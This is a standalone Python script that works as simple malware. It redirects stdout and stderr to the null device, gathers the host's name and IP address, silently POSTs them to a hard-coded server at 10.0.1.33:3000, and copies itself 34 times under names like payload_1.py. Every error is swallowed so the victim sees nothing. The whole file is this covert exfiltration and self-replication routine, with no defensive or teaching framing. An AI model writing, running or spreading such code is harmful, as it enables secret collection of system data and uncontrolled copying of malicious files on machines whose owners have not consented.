import shutil
import os
import socket
import requests
import json
import sys

def get_system_info():
    # Get the system's IP address and hostname
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address, hostname

def send_data_to_server(ip_address, hostname):
    # URL where the data will be sent
    url = "http://10.0.1.33:3000"
    
    # Create the payload to send as a JSON object
    data = {
        "ip_address": ip_address,
        "hostname": hostname
    }
    
    try:
        # Send the data as a POST request
        response = requests.post(url, json=data)
        # Check if the request was successful
        if response.status_code == 200:
            pass  # Data sent successfully, no need to print anything
        else:
            pass  # Handle error silently
    except requests.RequestException as e:
        pass  # Handle error silently

def replicate_script():
    current_file = __file__  # Get the current script's filename
    num_replicates = 34      # Number of times to replicate the script

    for i in range(1, num_replicates + 1):
        # Create a new filename for the replicate
        new_filename = f"payload_{i}.py"
        # Copy the current script to the new file
        shutil.copy(current_file, new_filename)
        # Replication happens silently without printing anything

def suppress_output():
    # Suppress console output (redirect stdout and stderr to /dev/null)
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

if __name__ == "__main__":
    suppress_output()  # Suppress any console output

    # Get system information
    ip_address, hostname = get_system_info()
    
    # Send system information to the server
    send_data_to_server(ip_address, hostname)
    
    # Replicate the script
    replicate_script()
